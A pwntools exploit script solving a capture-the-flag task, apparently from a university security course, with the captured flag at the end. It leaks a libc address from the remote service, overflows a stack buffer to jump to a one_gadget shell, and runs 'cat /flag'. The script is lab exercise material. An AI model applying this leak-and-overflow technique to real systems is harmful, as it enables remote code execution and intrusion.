from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file vuln
b *(main)
#b *(main+498)
#set detach-on-fork off
#set follow-fork-mode child
set follow-fork-mode parent
#catch fork
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33601)

#p=remote("127.0.0.1", 1024)



#p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n vuln)', shell=True)
#sleep(1)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


p.recvuntil(b"Mr. Frodo: ")
printf_addr = int(p.recvline().decode()[2:], 16)
print(hex(printf_addr))
libc_addr = printf_addr - 337328

#libc = ELF("./libc.so.6")
#libc.address = libc_addr

payload = b"A"*cyclic_find_bytes(0x6161616b)
#rop = ROP(libc)
#rop.raw(pack(rop.ret.address))
#rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
#payload += rop.chain()
payload += p64(libc_addr+0x4c139) #offset found with one_gadget
p.sendline(payload)

p.sendline(b"cat /flag")

p.interactive()

#softsec{hraSUWxVt0tbXTkSUs_VbF1ABWBU3hZKJ2TbIx6NO3qh95xR6yG4uaggcmjsHFij}